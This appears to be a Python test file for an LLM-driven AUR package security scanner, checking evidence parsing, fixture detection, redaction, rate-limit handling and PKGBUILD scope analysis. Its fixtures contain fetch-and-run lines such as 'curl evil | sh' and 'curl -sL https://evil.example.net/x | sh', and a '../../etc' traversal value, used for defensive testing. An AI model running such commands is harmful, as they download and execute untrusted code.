def selftest_evidence():
    """Offline checks for the evidence quote: parsing, cleaning, line lookup."""

    # Strict XML path, with the escaping the prompt asks for.
    parsed = parse_security_assessment(
        "<security_assessment><decision>UNSAFE</decision>"
        "<details>bad</details>"
        "<evidence>curl -s http://x/y | sh &amp;&amp; echo &lt;done&gt;</evidence>"
        "<summary>s</summary></security_assessment>"
    )
    assert parsed == ("UNSAFE", "bad", "s", "curl -s http://x/y | sh && echo <done>"), parsed

    # Regex fallback (the raw '<' breaks strict XML) still yields the quote.
    parsed = parse_security_assessment(
        "<security_assessment><decision>UNSAFE</decision>"
        "<details>a < b</details><evidence>x=1\ny=2</evidence>"
        "<summary>s</summary></security_assessment>"
    )
    assert parsed[3] == "x=1\ny=2", parsed

    # No tag at all: None, not a crash. Old-format responses keep working.
    parsed = parse_security_assessment(
        "<security_assessment><decision>SAFE</decision>"
        "<details>fine</details><summary>s</summary></security_assessment>"
    )
    assert parsed == ("SAFE", "fine", "s", None), parsed

    # Cleaning: fences and blank edges go, the size cap holds.
    assert clean_evidence(None) == ""
    assert clean_evidence("```bash\n\n  eval $x  \n\n```") == "  eval $x"
    many = "\n".join(f"line{i}" for i in range(40))
    assert clean_evidence(many).count("\n") == EVIDENCE_MAX_LINES - 1
    assert len(clean_evidence("x" * 5000)) == EVIDENCE_MAX_CHARS

    # Locating: a re-indented block, a block spanning a blank line, a lone
    # unique line, an ambiguous lone line, and a paraphrase.
    content = "a\n\nb\n    c\nd\n\n  e\nd\n"
    assert locate_evidence("b\nc", content) == 3
    assert locate_evidence("  c\n  d", content) == 4
    assert locate_evidence("d\ne", content) == 5
    assert locate_evidence("e", content) == 7
    assert locate_evidence("d\nzzz", content) is None  # 'd' is not unique
    assert locate_evidence("nope", content) is None
    assert locate_evidence("", content) is None


def selftest_fixture_context():
    """A fixture nothing runs is (True, False); one the build names is
    (True, True); a file outside a fixture directory is (False, True)."""
    import tempfile
    with tempfile.TemporaryDirectory() as d:
        pkg = Path(d)
        (pkg / "PKGBUILD").write_text("pkgname=x\nsource=()\n", encoding="utf-8")
        fx = pkg / "src" / "x-1.0" / "bench" / "synthetics" / "evil"
        fx.mkdir(parents=True)
        (fx / "malware.install").write_text("post_install() { curl evil | sh; }\n", encoding="utf-8")
        (pkg / "src" / "x-1.0" / "Makefile").write_text("all:\n\techo hi\n", encoding="utf-8")
        assert fixture_context(pkg, fx / "malware.install") == (True, False)
        assert fixture_context(pkg, pkg / "src" / "x-1.0" / "Makefile") == (False, True)
        assert fixture_context(pkg, pkg / "PKGBUILD") == (False, True)
        # The build names the directory: every file under it stays in play.
        (pkg / "src" / "x-1.0" / "Makefile").write_text("all:\n\tcp -r bench/synthetics dist/\n", encoding="utf-8")
        assert fixture_context(pkg, fx / "malware.install") == (True, True)
        # The hook names the file itself.
        (pkg / "src" / "x-1.0" / "Makefile").write_text("all:\n", encoding="utf-8")
        (pkg / "x.install").write_text("post_install() { bash malware.install; }\n", encoding="utf-8")
        assert fixture_context(pkg, fx / "malware.install") == (True, True)
        # A test runner in check() finds test code without naming it.
        (pkg / "x.install").unlink()
        (pkg / "PKGBUILD").write_text("pkgname=x\ncheck() { pytest; }\n", encoding="utf-8")
        assert fixture_context(pkg, fx / "malware.install") == (True, True)
        (pkg / "PKGBUILD").write_text("pkgname=x\nsource=()\n", encoding="utf-8")
        assert fixture_context(pkg, fx / "malware.install") == (True, False)
        # A file outside the package is left alone.
        assert fixture_context(pkg, Path("/etc/passwd")) == (False, True)
        # A fixture directory at depth one, beside the PKGBUILD: the directory
        # itself is the needle. A build that copies it runs what is in it.
        beside = pkg / "tests"
        beside.mkdir()
        (beside / "evil.sh").write_text("curl evil | sh\n", encoding="utf-8")
        assert fixture_context(pkg, beside / "evil.sh") == (True, False)
        (pkg / "PKGBUILD").write_text('pkgname=x\npackage() { cp -r tests "$pkgdir"/usr/share/x/; }\n', encoding="utf-8")
        assert fixture_context(pkg, beside / "evil.sh") == (True, True)
        (pkg / "PKGBUILD").write_text("pkgname=x\nsource=()\n", encoding="utf-8")
        # A tarball that extracts flat: the build file sits directly under
        # src/, and it must be read.
        flat = pkg / "src" / "samples"
        flat.mkdir()
        (flat / "install.sh").write_text("curl evil | sh\n", encoding="utf-8")
        assert fixture_context(pkg, flat / "install.sh") == (True, False)
        (pkg / "src" / "Makefile").write_text("all:\n\tsh samples/install.sh\n", encoding="utf-8")
        assert fixture_context(pkg, flat / "install.sh") == (True, True)


def selftest_error_description():
    """An API error's body never reaches a report line, a failed command
    contributes its program and status but not its arguments, and this
    program's own errors pass through."""
    import httpx
    from openai import RateLimitError

    body = {"error": {"message": "free-models-per-day exceeded for user_secret", "code": 429}}
    resp = httpx.Response(
        429, json=body, request=httpx.Request("POST", "https://llm.internal/v1")
    )
    e = RateLimitError(f"Error code: 429 - {body}", response=resp, body=body)
    assert "user_secret" in str(e)  # the raw form is the hazard
    msg = describe_error(e)
    assert "429" in msg, msg
    assert "user_secret" not in msg and "llm.internal" not in msg, msg

    e = subprocess.CalledProcessError(1, ["/usr/bin/makepkg", "--nobuild", "/data/bulk/pkg"])
    assert describe_error(e) == "makepkg exited with status 1", describe_error(e)
    e = subprocess.CalledProcessError(2, "git clone https://aur.archlinux.org/x.git /data/x")
    assert describe_error(e) == "git exited with status 2", describe_error(e)

    assert describe_error(RuntimeError("no assessment tag")) == "RuntimeError: no assessment tag"

    e = FileNotFoundError(2, "No such file or directory", "/home/someone/pkg/x.install")
    assert describe_error(e) == "FileNotFoundError: No such file or directory", describe_error(e)


def selftest_pkgbase():
    """A split package resolves to its base; everything else -- the same
    name, no result, a malformed reply, a base that is not a name -- is the
    name itself."""
    reply = {"resultcount": 1, "type": "multiinfo", "version": 5,
             "results": [{"Name": "immich-server", "PackageBase": "immich"}]}
    assert pkgbase_from_rpc(reply, "immich-server") == "immich"
    assert pkgbase_from_rpc(reply, "immich") == "immich"
    assert pkgbase_from_rpc({"resultcount": 0, "results": []}, "gone") == "gone"
    assert pkgbase_from_rpc({"error": "Incorrect request type specified."}, "x") == "x"
    assert pkgbase_from_rpc("not json", "x") == "x"
    assert pkgbase_from_rpc({"results": ["x", None]}, "x") == "x"
    evil = {"results": [{"Name": "x", "PackageBase": "../../etc"}]}
    assert pkgbase_from_rpc(evil, "x") == "x"
    assert pkgbase_from_rpc({"results": [{"Name": "x", "PackageBase": 7}]}, "x") == "x"


def selftest_quota_reset():
    """A per-day 429 yields its reset epoch, in seconds; a per-minute one,
    or any other error, yields nothing; a per-day one that does not say
    when means the next 00:00 UTC. The note lands where the pipeline asked."""
    import httpx
    from openai import AuthenticationError, RateLimitError

    def err(message, headers=None, status=429):
        body = {"error": {"message": message, "code": status}}
        if headers is not None:
            body["error"]["metadata"] = {"headers": headers}
        resp = httpx.Response(
            status, json=body, request=httpx.Request("POST", "https://llm.internal/v1")
        )
        cls = RateLimitError if status == 429 else AuthenticationError
        return cls(f"Error code: {status} - {body}", response=resp, body=body)

    future_ms = (int(time.time()) + 3600) * 1000
    got = quota_reset_from_error(err(
        "Rate limit exceeded: free-models-per-day-high-balance. ",
        {"X-RateLimit-Limit": "1000", "X-RateLimit-Remaining": "0",
         "X-RateLimit-Reset": str(future_ms)},
    ))
    assert got == future_ms // 1000, got
    assert quota_reset_from_error(err(
        "Rate limit exceeded: free-models-per-min. ", {"X-RateLimit-Reset": str(future_ms)}
    )) is None
    assert quota_reset_from_error(err("bad key", status=401)) is None
    assert quota_reset_from_error(RuntimeError("per-day")) is None
    now = int(time.time())
    got = quota_reset_from_error(err("free-models-per-day exceeded"))
    assert now < got <= now + 86400 and got % 86400 == 0, got

    # The shape line: what a 429 that did NOT match carried, so a run in
    # production can say why. Every field quota_reset_from_error reads, and
    # nothing else; a long message is cut rather than logged whole.
    shape = rate_limit_shape(err("Rate limit exceeded: free-models-per-min. ",
                                 {"X-RateLimit-Reset": "1787616000000"}))
    assert "free-models-per-min" in shape, shape
    assert "body-reset='1787616000000'" in shape, shape
    assert "response-reset=" in shape, shape
    assert rate_limit_shape(err("x" * 500)).count("x") == 300, "the message is cut"
    assert "message=''" in rate_limit_shape(RuntimeError("no body here")), "any error is safe"

    with tempfile.TemporaryDirectory() as d:
        path = os.path.join(d, "reset")
        old = os.environ.get("AUR_SLEUTH_QUOTA_RESET_FILE")
        os.environ["AUR_SLEUTH_QUOTA_RESET_FILE"] = path
        try:
            note_quota_reset(1787616000)
        finally:
            if old is None:
                os.environ.pop("AUR_SLEUTH_QUOTA_RESET_FILE", None)
            else:
                os.environ["AUR_SLEUTH_QUOTA_RESET_FILE"] = old
        with open(path, encoding="utf-8") as f:
            assert f.read() == "1787616000\n"


def selftest_file_caps():
    """The two caps that keep a file review in memory and under the request
    limit: a byte cap by stat, and a character cap after the line cap."""
    marker = "characters omitted"
    # Small stays whole; many short lines are cut by lines and stay under the
    # character cap; one enormous line is cut by characters.
    assert _smart_truncate_for_audit("x\n" * 10) == "x\n" * 10
    many = "line\n" * 5000
    cut = _smart_truncate_for_audit(many)
    assert cut.count("\n") < 5000 and marker not in cut and len(cut) <= MAX_FILE_CHARS
    one = "a" * 300_000
    cut = _smart_truncate_for_audit(one)
    assert marker in cut and len(cut) < MAX_FILE_CHARS + 200, len(cut)
    assert cut.startswith("a" * 100) and cut.endswith("a" * 100)
    # Both at once: 5000 lines of 200 chars is 1 MB; the line cap leaves ~1500
    # lines (~300k chars) and the character cap takes it the rest of the way.
    # The line cap's own marker sits in the middle it cuts away; what
    # survives is the head, the tail, and the character marker between.
    both = _smart_truncate_for_audit(("b" * 199 + "\n") * 5000)
    assert marker in both and len(both) < MAX_FILE_CHARS + 200, len(both)
    assert both.startswith("b" * 199 + "\n") and both.endswith("b" * 199 + "\n")
    # The byte cap never reads the file: a sparse file is all size and no bytes.
    with tempfile.TemporaryDirectory() as d:
        small = Path(d) / "small.sh"
        small.write_text("#!/bin/sh\n")
        assert file_exceeds_size_cap(small) is None
        huge = Path(d) / "installer.run"
        with open(huge, "wb") as f:
            f.truncate(MAX_FILE_BYTES + 1)
        assert file_exceeds_size_cap(huge) == MAX_FILE_BYTES + 1
        assert file_exceeds_size_cap(Path(d) / "absent") is None
    print("✓ selftest_file_caps")


def selftest_file_priority():
    """The ranking that decides which files a review slot is spent on: build
    and install code first, documentation last, and vendored third-party
    bundles down with the documentation however executable they look."""

    # The AUR-controlled surface and code that runs: the top tier.
    assert file_security_priority(Path("PKGBUILD")) == 3
    assert file_security_priority(Path("app.install")) == 3
    assert file_security_priority(Path("fix-build.patch")) == 3
    assert file_security_priority(Path("src/x/meson.build")) == 3

    # Documentation and signatures: nothing to execute.
    assert file_security_priority(Path("README.md")) == 0
    assert file_security_priority(Path("COPYING")) == 0
    assert file_security_priority(Path("src/x.tar.gz.sig")) == -1

    # A vendored bundle is upstream's, from a third party, and identical for
    # every user of that release. It ranks with documentation even when the
    # file's own name or extension would otherwise put it at the top.
    for vendored in (
        "src/app/node_modules/pkg/build/index.js",
        "src/app/node_modules/pkg/package.json",
        "src/ui/bower_components/thing/dist/thing.js",
        "src/x/3rdparty/Vc/cmake/OptimizeForArchitecture.cmake",
        "src/x/vendor/github.com/foo/bar.go",
        "src/x/lib/site-packages/requests/api.py",
    ):
        assert file_security_priority(Path(vendored)) == 0, vendored

    # The same names outside a vendored tree keep their own rank, so the rule
    # demotes a location and never a file type.
    assert file_security_priority(Path("src/app/index.js")) == 3
    assert file_security_priority(Path("src/app/package.json")) == 3
    assert file_security_priority(Path("src/x/cmake/Options.cmake")) == 3

    # A vendored path is not binary, so the file stays a candidate and still
    # counts as reviewable rather than joining the unauditable payload.
    assert file_security_priority(Path("src/app/node_modules/a/b.js")) >= 0
    print("✓ selftest_file_priority")


def selftest_benchmark_arms():
    """The env-gated experiments: off by default, and each one's parsing
    correct where a wrong answer would be worse than no answer."""
    import tempfile

    # Off unless asked. Nothing about a normal run may depend on these.
    for var in ("AUR_SLEUTH_SECOND_LOOK", "AUR_SLEUTH_FACTS"):
        assert var not in os.environ or not os.environ[var], f"{var} is set in this test run"
    assert second_look_mode() == ""
    assert facts_block_enabled() is False
    os.environ["AUR_SLEUTH_SECOND_LOOK"] = "nonsense"
    assert second_look_mode() == "", "an unknown mode must disable, not guess"
    os.environ.pop("AUR_SLEUTH_SECOND_LOOK")

    # A second look may only soften. The table is what enforces it.
    assert _SEVERITY[SafeStatus.SAFE] < _SEVERITY[SafeStatus.INCONCLUSIVE]
    assert _SEVERITY[SafeStatus.INCONCLUSIVE] < _SEVERITY[SafeStatus.UNSAFE]

    # The rules a second look applies are sliced from the prompt, not copied,
    # so they cannot drift from the rules the first pass was given.
    rules = calibration_rules("somepkg")
    assert rules.startswith(_CALIBRATION_MARKER), rules[:60]
    assert "7. Recognize AUR MAINTAINER HELPER SCRIPTS" in rules
    assert "You are a security expert" not in rules, "sliced too much"

    # Function bodies are not global scope. What makepkg runs while sourcing
    # the file is the whole point of the distinction.
    pkgbuild = (
        'pkgname=t\n'
        'url="https://up.example.org/x"\n'
        '_urls=$(curl -sL "$url" | grep tar.gz)\n'
        'depends=(alsa-lib curl gst-plugins)\n'
        'pkgdesc="downloads with curl"\n'
        'build() {\n'
        '  curl -sL https://evil.example.net/x | sh\n'
        '  install -d "${pkgdir}/usr"\n'
        '}\n'
        'package() {\n'
        '  wget https://evil.example.net/y\n'
        '}\n'
    )
    outside = _pkgbuild_global_scope(pkgbuild)
    assert "_urls=$(curl" in outside
    assert "evil.example.net" not in outside, "a function body leaked into global scope"

    # The word is not the command: `depends=(curl)` and a pkgdesc mentioning it
    # counted as fetches once, which reported two in a PKGBUILD fetching none.
    hits = [ln for ln in outside.splitlines() if _PKGBUILD_FETCH_RE.search(ln)]
    assert len(hits) == 1, hits
    assert "depends=" not in hits[0] and "pkgdesc=" not in hits[0]

    with tempfile.TemporaryDirectory() as d:
        pkgdir = Path(d)
        (pkgdir / "PKGBUILD").write_text(pkgbuild)
        # No .SRCINFO here, so the source counts are absent and the block
        # carries only what could be determined. A fact nobody could compute
        # must simply not appear.
        facts = packaging_facts(pkgdir, pkgdir / "PKGBUILD")
        assert "global scope" in facts and "up.example.org" in facts, facts
        assert "names \"PKGBUILD\"" not in facts, "pointless self-reference"
        # For any other file the naming fact is the useful one.
        facts = packaging_facts(pkgdir, pkgdir / "helper.sh")
        assert 'names "helper.sh": no' in facts, facts
        (pkgdir / "PKGBUILD").write_text(pkgbuild + "\n# see helper.sh\n")
        assert 'names "helper.sh": yes' in packaging_facts(pkgdir, pkgdir / "helper.sh")

    print("✓ selftest_benchmark_arms")


def selftest_redaction():
    """What the environment says about this machine never reaches a report:
    the endpoint host, a home directory, a credential-shaped value, and the
    operator's own list -- while a public API host is left alone."""
    import tempfile

    env = {
        "OPENAI_BASE_URL": "http://llm.internal.example:8080/v1",
        "HOME": "/home/tester",
        "OPENAI_API_KEY": "sk-or-v1-abcdef0123456789",
        "SHORT_KEY": "abc",
        "AUR_SLEUTH_INTERNAL_STRINGS": "corp.lan,user_secretid",
    }
    needles = operator_strings(env)
    assert "llm.internal.example" in needles and "/home/tester" in needles, needles
    assert "sk-or-v1-abcdef0123456789" in needles and "abc" not in needles, needles
    assert {"corp.lan", "user_secretid"} <= set(needles), needles
    text = (
        "called http://llm.internal.example:8080/v1 from /home/tester/x "
        "with sk-or-v1-abcdef0123456789 for user_secretid at corp.lan"
    )
    out = redact(text, needles)
    for s in needles:
        assert s not in out, out
    assert out.count(REDACTED) == 5, out
    assert "openrouter.ai" not in operator_strings(
        {"OPENAI_BASE_URL": "https://openrouter.ai/api/v1"}
    )
    assert operator_strings({"HOME": "/root"}) == []

    # The report applies it on every write.
    saved = {k: os.environ.get(k) for k in env}
    os.environ.update(env)
    try:
        with tempfile.TemporaryDirectory() as d:
            path = Path(d) / "r.txt"
            with Report(path) as report:
                report.write("endpoint llm.internal.example answered for user_secretid")
            written = path.read_text(encoding="utf-8")
    finally:
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    assert "llm.internal.example" not in written and "user_secretid" not in written, written
    assert written.count(REDACTED) == 2, written


